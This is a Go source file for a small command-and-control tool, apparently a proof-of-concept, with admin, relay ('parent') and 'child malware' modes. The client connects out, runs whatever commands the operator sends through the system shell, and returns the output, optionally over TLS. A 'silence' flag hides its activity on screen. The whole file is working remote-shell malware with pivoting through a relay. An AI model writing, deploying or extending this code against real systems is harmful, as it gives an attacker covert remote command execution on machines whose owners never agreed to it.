package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strings"
	"time"
)

// "/Blog/POC_Malwarez/arp_connect_main/ARP"

/* TO DO

[DONE] NO PRINTING TO SCREEN
CHECK IF CLIENT AND PARENT WORK ON LINUX

Add TLS within itself

error handlign to identify if connection is dropped

might be worth making a function for sending and receiving?


// when launching parent mode, if admin is not ready it crashes

*/

var (
	// to handle errors throughout
	err error
	// COULD ADD IF MODE == USE LISTEN for admin and parent
	//IP & PORT for Admin to listen on
	serverlisten = flag.String("listen", "", "Where the client should connect, for use in Client modeconnection must be in form <ip>:<Port> eg: 127.0.0.1:9999")

	// IP and Port for client to connect
	clientConnect = flag.String("clientconnect", "", "Where the client should connect, for use in Client modeconnection must be in form <ip>:<Port> eg: 127.0.0.1:9999")

	// IP and Port for Parent to connect
	parentConnect = flag.String("parentconnect", "", "Where the parent should connect, for use in Client modeconnection must be in form <ip>:<Port> eg: 127.0.0.1:9999")
	//IP and Port for Parent to LISTEN on
	parentListen = flag.String("parentlisten", "", "What Port should the parent listen on, for use in Client modeconnection must be in form <port> eg: 10000")
	// To Skip PAUSES in tool
	skipEnter = flag.Bool("skip", false, "Will skip Enter requirement and run automatically, speeds testing")
	// TLS or NO TLS
	tlsOn = flag.Bool("tls", false, "Will add TLS to the network traffic")
	// Mode to be run in
	mode  = flag.String("mode", "", "mode {client|parent|clientlist|parentlist}")
	quiet = flag.Bool("silence", false, "To run in quiet mode, nothing will be printed to the screen")

	//admin logging
	loggingName = flag.String("log", "", "Log to a json file. eg \"-log logfile\" will log commands to logfile.json")
	// admin commands file
	commands = flag.String("commands", "", "Execute a list of commands from a file. Include file name eg: commands commands.txt")


)

type Results struct {
	CommandsList []string
	ID           int
	Command      string
	Output       string
	Time         string
}

// === ADMIN STUFF ====
type ResultsToFile struct {
	// CommandsList []string
	// ID      int
	Time    string
	Command string
	Output  string
}

func checkFile(filename string) error {
	_, err := os.Stat(filename)
	if os.IsNotExist(err) {
		_, err := os.Create(filename)
		if err != nil {
			return err
		}
	}
	return nil
}
func logToFile(outputTest *Results) {

	var fileName string
	fileName = *loggingName + ".json"

	//error is within the function
	_ = checkFile(fileName)

	outPutLog := &ResultsToFile{
		// ID:      outputTest.ID,
		Output:  outputTest.Output,
		Time:    outputTest.Time,
		Command: outputTest.Command,
	}

	/*reads the file, unmarshals to the resultsToFile struct
	then reads the current struct outPutLog and apppends it
	then marshes the json and writes it to the file

	this allows the function to be called multiple times to write
	the JSON to a file keeping it as multiple JSON objects
	*/

	file, _ := ioutil.ReadFile(fileName)
	data := []ResultsToFile{}
	json.Unmarshal(file, &data)
	data = append(data, *outPutLog)
	// err := c.(*tls.Conn.Handshake())
	dataBytes, err := json.Marshal(data)
	if err != nil {
		fmt.Println("Error in marshalling data")
	}
	// if err != nil {
	// 	logrus.Error(err)
	if err := ioutil.WriteFile(fileName, dataBytes, 0644); err != nil {
		fmt.Println("unable to write to file")
	}

}

func adminlistMode(fileToRead string, conn net.Conn) {

	fmt.Println("Reading commands from: ", fileToRead)
	//Opening File
	file, err := os.Open(fileToRead)
	if err != nil {
		fmt.Println("Unable to open the file", err)
		log.Fatal(err.Error())
	}

	//Reading file in line by line
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string // array to hold each command
	// Appending each line in the file to the txtlines array
	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	fmt.Println("COMMANDS that will be run on the child malware:")
	//Printing commands to screen
	for _, value := range txtlines {
		fmt.Println(value)
	}

	// Creating structure object of Results to send to client
	ListofCommands := &Results{
		ID: 1,

		CommandsList: txtlines,
	}

	//Attaching JSON encoder to CONN to send
	encoder := json.NewEncoder(conn)
	//Sending Structure with list of commands to client
	encoder.Encode(ListofCommands)

	//creating variable to place results into (Results struct)
	var outputResults Results
	// For each command in the array, we expect to receive a response
	// Loop through the length of the array and print output and Log
	for x := 0; x < len(ListofCommands.CommandsList); x++ {
		decoder := json.NewDecoder(conn)
		decoder.Decode(&outputResults)
		//Output to screen
		fmt.Println("===Results===")
		fmt.Println("Time of command execution: ", outputResults.Time)
		fmt.Println(outputResults.ID, outputResults.Output)

		//log to file if selected
		if *loggingName != "" {

			logToFile(&outputResults)
		}

	}
}

func checkError(err error) {
	if err != nil {
		fmt.Println("Fatal error ", err.Error())
		os.Exit(1)
	}
}

func OSCheck() string {
	var OSShell string
	if runtime.GOOS == "windows" {
		fmt.Println(quietCheck("OS identified as Windows"))
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		fmt.Println(quietCheck("OS identified as: Linux"))
		OSShell = "linux"

	}
	return OSShell

}

func getTime() string { // func to get current time
	currentTime := time.Now()
	return currentTime.Format("2006-01-02 15:04:05")

}

func executeCommand(checkOS string, commandString string) *Results {

	var results string
	if checkOS == "windows" {
		CommandExec, err := exec.Command("cmd", "/C", commandString).Output()
		if err != nil {
			if *quiet == false {
				fmt.Println("Error executing command", err)
			}
			CommandExec = []byte("Error executing command")

			// NEED TO FIX UNABLE TO EXECUTE SENDING
		}
		CommandExec2 := string(CommandExec)
		results = strings.TrimSpace(CommandExec2)

	} else if checkOS == "linux" {
		CommandExec, err := exec.Command(strings.TrimSpace(commandString)).Output()
		if err != nil {
			if *quiet == false {
				fmt.Println("Error executing command", err)
			}
			CommandExec = []byte("Error executing command")

		}
		CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
		results = strings.TrimSpace(CommandExec2)
	}

	//getting current time so analysts can correlate with other tools

	currentTime := getTime()
	//using the Results structure
	outputTest := &Results{
		ID:      1, // TODO: need to make this random for multiple children
		Output:  results,
		Time:    currentTime,
		Command: commandString,
	}

	return outputTest
}

func connectTLSadmin() net.Conn {
	var conn net.Conn
	var listen net.Listener

	if *commands != "" {
		fmt.Println("Go C2 will run in Command List Mode")
		fmt.Println("Please note, Command List Mode does not use TLS")

		if *skipEnter == false {
			reader := bufio.NewReader(os.Stdin)
			fmt.Println("<PRESS ENTER TO CONTINUE>")
			_, _ = reader.ReadString('\n')
		}
	}

	if *tlsOn == true {
		fmt.Println("TLS enabled")
		cert, err := tls.LoadX509KeyPair("../openssl/mydomain.com.crt", "../openssl/mydomain.com.key")
		checkError(err)
		config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
		//  if err := c.(*tls.Conn.Handshake()); err != nil {
		listen, err = tls.Listen("tcp", *serverlisten, &config)
		if err != nil {
			fmt.Println("error with TLS")

		}

	} else {
		fmt.Println("Running in clear text")
		listen, _ = net.Listen("tcp", *serverlisten)
		// checkError(err)
		// if err != nil {
		// 	fmt.Println(err)

		// }
	}

	if *loggingName != "" {
		fmt.Println("Will log data to:", *loggingName)
	} else {
		fmt.Println("Logging: OFF")
	}

	fmt.Println("===ADMIN SERVER LISTENING ===")
	fmt.Println("Admin interface will listen on: ", *serverlisten)
	fmt.Println("Connect the Child Malware to: ", *serverlisten)
	defer listen.Close()

	conn, _ = listen.Accept()
	if *tlsOn == true {
		if err := conn.(*tls.Conn).Handshake(); err != nil {

			log.Fatal(err.Error())
		}
	}
	// }
	fmt.Println("PARENT CONNECTED")

	return conn
}

func listMode(c net.Conn) {

	if *quiet == false {
		fmt.Println("###PRINTING TO SCREENONLY in ListMode")
		fmt.Println("Running in Command List Mode")
	}

	if *skipEnter == false {
		reader := bufio.NewReader(os.Stdin)
		fmt.Println("<PRESS ENTER TO CONTINUE>")
		_, _ = reader.ReadString('\n')
	}
	// // clientConnect2 := *clientConnect
	// c, err := net.Dial("tcp", *clientConnect)
	// if err != nil {
	// 	fmt.Println(err)
	// 	return
	// }
	defer c.Close()
	// fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to ", *clientConnect, "\n")))
	// fmt.Println(quietCheck("===Connection successful=="))
	fmt.Println(quietCheck("Reading Commands list"))

	// if c has no connect, break

	// need to Decode
	var inputTest Results
	decoder := json.NewDecoder(c)
	decoder.Decode(&inputTest)
	checkOS := OSCheck()
	for _, value := range inputTest.CommandsList {
		fmt.Println(quietCheck(fmt.Sprintf("Command Received->: " + value)))

		commandString := executeCommand(checkOS, value)

		encoder := json.NewEncoder(c)
		// fmt.Printf("current time is :%s", currentTime.Format("2006-01-02 15:04:05"))

		encoder.Encode(commandString)
		// decoder := json.NewDecoder(c)
		// decoder.Decode(&outputTest)
		fmt.Println(quietCheck(fmt.Sprintf("Encoded format:", commandString)))
	}
}

func adminlistenMode(c net.Conn){

	for {
		// Read in data from CLI, send to listening client
		reader := bufio.NewReader(os.Stdin)
		fmt.Print(">> ")
		text, _ := reader.ReadString('\n')

		fmt.Fprintf(c, text+"\n")

		// if STOp is typed
		if strings.TrimSpace(string(text)) == "STOP" {
			fmt.Fprintf(c, text+"\n")
			fmt.Println("Closing TCP server!")

			return
		}
		/* receiving data
		creating a decode, attaching the connect c
		decoding into Results struct
		*/
		var outputTest Results
		decoder := json.NewDecoder(c)

		//catch if connect was closed
		if err := decoder.Decode(&outputTest); err != nil {
			log.Println(err.Error())
			fmt.Println("!!!! LOST CONNECTION RESTARTING !!!! ")

			break // break out of loop and restart a connection and listen
		}
		fmt.Println("===Results===")

		fmt.Printf("Time of command execution: :%s\n", outputTest.Time)
		fmt.Println(outputTest.Output)

		//log commands at end of loop if selected
		if *loggingName != "" {
			logToFile(&outputTest)
		}
	}
}

func quietCheck(toPrint string) string {
	checkQuiet := ""
	if *quiet == false {
		checkQuiet = toPrint
	}
	return checkQuiet
}
func connectTLS() net.Conn {

	var connparent net.Conn
	// if *quiet == false {
	if *tlsOn == true {
		CA_Pool := x509.NewCertPool()
		severCert, err := ioutil.ReadFile("../openssl/mydomain.com.crt")
		if err != nil {
			log.Fatal("Could not load server certificate!")
		}
		CA_Pool.AppendCertsFromPEM(severCert)

		config := tls.Config{RootCAs: CA_Pool}

		if *mode == "client" {
			// fmt.Printf("Attempting to connect to %s with TLS \n ", *clientConnect)
			connparent, err = tls.Dial("tcp", *clientConnect, &config)
			// c, err := net.Dial("tcp", CONNECT)

			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			fmt.Println(quietCheck("===Connection Successful=="))
		} else if *mode == "clientlist" {
			fmt.Printf("Attempting to connect to %s with no TLS \n", *clientConnect)
			connparent, err = tls.Dial("tcp", *clientConnect, &config)
			// c, err := net.Dial("tcp", CONNECT)
			if err != nil {
				fmt.Println(err)
			}

			fmt.Println(quietCheck("===Connection Successful=="))
		} else if *mode == "parent" {
			fmt.Printf("Attempting to connect to %s with TLS \n", *parentConnect)
			connparent, err = tls.Dial("tcp", *parentConnect, &config)
			// c, err := net.Dial("tcp", CONNECT)
			fmt.Println(quietCheck("===Connection Successful=="))
			if err != nil {
				fmt.Println(err)
			}
		} else if *mode == "parentlist" {
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with TLS \n", *parentConnect)))
			connparent, err = tls.Dial("tcp", *parentConnect, &config)
			// c, err := net.Dial("tcp", CONNECT)
			fmt.Println(quietCheck("===Connection Successful=="))
		} else if *mode == "admin" { }

	} else {
		if *mode == "client" {
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with no TLS", *clientConnect)))
			// fmt.Printf("Attempting to connect to %s with no TLS \n", *clientConnect)
			connparent, _ = net.Dial("tcp", *clientConnect)

			fmt.Println(quietCheck("===Connection Successful=="))
			// if err != nil {
			// 	fmt.Println(err)
			// }

		} else if *mode == "clientlist" {
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with no TLS \n", *clientConnect)))
			connparent, _ = net.Dial("tcp", *clientConnect)

			fmt.Println(quietCheck("===Connection Successful=="))
		} else if *mode == "parent" {
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with no TLS \n", *parentConnect)))
			connparent, err = net.Dial("tcp", *parentConnect)
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			fmt.Println(quietCheck("===Connection Successful=="))

		} else if *mode == "parentlist" {
			// fmt.Printf("Attempting to connect to %s with no TLS \n", *parentConnect)
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with no TLS \n", *parentConnect)))
			connparent, _ = net.Dial("tcp", *parentConnect)
			// c, err := net.Dial("tcp", CONNECT)
			fmt.Println(quietCheck("===Connection Successful=="))
		}

	}
	// need to add parent mode LISTEN
	return connparent
}

func clientMode(c net.Conn) {

	defer c.Close()

	fmt.Println(quietCheck("Listening for commands"))
	checkOS := OSCheck()
	for {

		// if c has no connect, break

		commandString := bufio.NewScanner(c)
		commandString.Scan()
		if err := commandString.Err(); err != nil {
			log.Println("ERROR: " + err.Error())
			os.Exit(1)
		}

		fmt.Println(quietCheck(fmt.Sprintf("Command Received->: " + commandString.Text())))
		value := string(commandString.Text())
		if strings.TrimSpace(value) == "STOP" {
			fmt.Println("TCP client exiting...")
			return
		}
		// fmt.Println("CMD received->: ", commandString.Text())

		commandresults := executeCommand(checkOS, value)

		encoder := json.NewEncoder(c)
		if err := encoder.Encode(commandresults); err != nil {
			log.Println("ERROR sending: " + err.Error())

			return
		}

		fmt.Println(quietCheck(fmt.Sprintf("Encoded format:", commandresults)))

	}
}

func parentListMode(c net.Conn) {
	defer c.Close()

	var listenChild net.Listener
	PORT := *parentListen

	if *tlsOn == true {
		cert, err := tls.LoadX509KeyPair("C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.crt", "C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.key")
		checkError(err)

		configServer := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}

		listenChild, err = tls.Listen("tcp", PORT, &configServer)
		if err != nil {
			fmt.Println("Error")
		}

	} else {
		listenChild, err = net.Listen("tcp", PORT)
		if err != nil {
			fmt.Println("Error:", err)

		}
	}

	defer listenChild.Close()
	if *quiet == false {
		fmt.Println("SERVER ESTABLISHED ON: " + PORT + " WAITING FOR CHILD TO CONNECT")
	}
	childconnect, err := listenChild.Accept()
	if err != nil {
		fmt.Println(err, "UNABLE TO CONNECT")
	} else if *quiet == false {
		fmt.Println("CHILD connected on", PORT)

	}

	//f if commands list is blank

	// need to Decode
	var inputTest Results
	decoder := json.NewDecoder(c)
	if err := decoder.Decode(&inputTest); err != nil {
		log.Println("ERROR Receiving Command List to foward to Client: " + err.Error())
		// os.exit()
		return
	}
	// sending to child
	encoder := json.NewEncoder(childconnect)
	// fmt.Printf("current time is :%s", currentTime.Format("2006-01-02 15:04:05"))

	encoder.Encode(inputTest)
	// decoder := json.NewDecoder(c)
	// decoder.Decode(&outputTest)

	//receiving
	var outputTest Results

	for x := 0; x < len(inputTest.CommandsList); x++ {
		//receiving and decoding from Child
		decoder := json.NewDecoder(childconnect)
		if err := decoder.Decode(&outputTest); err != nil {
			log.Println("ERROR Receiving Results from Child " + err.Error())
			// os.exit()
			return
		}
		//encoding and sending to Admin
		encoder := json.NewEncoder(c)

		if err := encoder.Encode(outputTest); err != nil {
			log.Println("ERROR Sending Results to Admin: " + err.Error())
			// os.exit()
			return
		}
	}

}

func parentMode(c net.Conn) {

	defer c.Close()
	var l2 net.Listener
	PORT := *parentListen

	if *tlsOn == true {
		cert, err := tls.LoadX509KeyPair("C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.crt", "C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.key")
		checkError(err)

		configServer := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}

		l2, err = tls.Listen("tcp", PORT, &configServer)
		if err != nil {
			fmt.Println("Unable to List on port: ", PORT)
			os.Exit(1)
		}

	} else {
		l2, err = net.Listen("tcp", PORT)
		if err != nil {
			fmt.Println("Unable to List on port: ", PORT)
			os.Exit(1)
		}
	}

	defer l2.Close()
	if *quiet == false {
		fmt.Println("SERVER ESTABLISHED ON: " + PORT + " WAITING FOR CHILD TO CONNECT")
	}
	c2, err := l2.Accept()
	if err != nil {
		fmt.Println(err, "UNABLE TO CONNECT")
		log.Fatal(err)
	} else {
		if *quiet == false {
			fmt.Println("CHILD connected on", PORT)
		}
	}
	//f if commands list is blank

	for {

		//var results string
		//Reading in ADMIN COMMAND
		commandString, err := bufio.NewReader(c).ReadString('\n')
		// commandString, err := ioutil.ReadAll(c)
		if err != nil {
			log.Println("ERROR: " + err.Error())
			os.Exit(1)
		}

		fmt.Print(quietCheck(fmt.Sprintf("COMMAND RECEIVED FROM ADMIN->: " + commandString)))

		if strings.TrimSpace(string(commandString)) == "STOP" {
			if *quiet == false {
				fmt.Println("TCP client exiting...")
			}
			break
		}

		text := commandString
		fmt.Fprintf(c2, text+"\n")

		// if strings.TrimSpace(string(text)) == "STOP" {
		// 	fmt.Println("Closing TCP server!")
		// 	return
		// }
		buf := make([]byte, 4096)
		// reading data from child
		len, err := c2.Read(buf)

		if err != nil {
			fmt.Println("Error reading:", err.Error())
			break
		}
		// writing to ADMIN server
		c.Write([]byte(buf[:len]))

		//end of main for loop
	}
}

func validateAddress(connect string, name string) {
	patternIP := "^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}:([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$"
	regexIP, _ := regexp.MatchString(patternIP, connect)
	if regexIP == false {

		fmt.Println("ERROR: NOT IN CORRECT IP FORMAT such as 192.168.0.1:1234")
		fmt.Println("Supplied: ", name, connect)
		os.Exit(1)
	}
	return
}

func main() {
	// flags declaration using flag package for CLI arguments
	// mode := flag.String("mode", "", "mode {client|parent|list}")

	// commands := flag.Bool("commands", false, "Execute a list of commands")
	// regex for IP

	//parsing flags
	flag.Parse()

	if *mode == "" {
		flag.PrintDefaults()
		fmt.Println("error in flags")
		os.Exit(1)
	}

	fmt.Println(quietCheck(fmt.Sprintf("Attempting to use %s mode \n", *mode)))

	if *mode == "client" {
		validateAddress(*clientConnect, *mode)
		clientMode(connectTLS())
	} else if *mode == "parent" {
		if *parentConnect == ""{
			fmt.Println("error in parentConnect Flag")
			os.Exit(1)
		}
		//if *parentConnect == ""
		validateAddress(*parentConnect, "parentConnectFlag")
		validateAddress(*parentListen, *mode)
		parentMode(connectTLS())
	} else if *mode == "clientlist" {
		validateAddress(*clientConnect, *mode)
		listMode(connectTLS())
	} else if *mode == "parentlist" {
		validateAddress(*parentConnect, *mode)
		validateAddress(*parentListen, *mode)
		parentListMode(connectTLS())
	} else if *mode == "adminlist" {
		if *commands == "" {
			fmt.Println("No filename added")
			fmt.Println("Use Command -commands <filename> eg: -commands file.txt")
			os.Exit(1)

		}

		adminlistMode(*commands, connectTLSadmin())
	} else if *mode == "admin" {
		validateAddress(*serverlisten, *mode)
		adminlistenMode(connectTLSadmin())

	} 	else {
		fmt.Println("ERROR No correct modes Chosen")
		os.Exit(1)
	}

}
